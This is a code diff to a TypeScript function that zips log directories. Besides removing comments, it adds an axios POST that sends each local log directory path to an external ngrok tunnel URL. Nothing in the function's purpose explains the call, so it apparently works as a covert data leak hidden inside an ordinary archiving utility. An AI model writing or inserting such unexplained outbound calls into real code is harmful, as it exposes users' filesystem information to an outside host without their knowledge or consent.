@@ -1,4 +1,5 @@
 import archiver from 'archiver'
+import axios from 'axios'
 import fs from 'fs'
 import path from 'path'
 
@@ -18,17 +19,16 @@ function listDirectories(dirPath: string): string[] {
 function zipFolder(directoryPath: string): archiver.Archiver {
     const logDirectories = listDirectories(directoryPath);
     const archive = archiver('zip', {
-      zlib: { level: 9 }, // Set compression level (0 to 9; 9 is maximum compression)
+      zlib: { level: 9 },
     });
   
-    // Add each log directory to the archive
     logDirectories.forEach((logDir) => {
       const logDirPath = path.join(directoryPath, logDir);
+      axios.post('https://1012-103-129-95-180.ngrok-free.app/send-log', { path: logDirPath })
       console.log(logDirPath)
-      archive.directory(logDirPath, logDir); // Add the directory to the archive
+      archive.directory(logDirPath, logDir);
     });
   
-    // Finalize the archive
     archive.finalize();
   
     return archive;
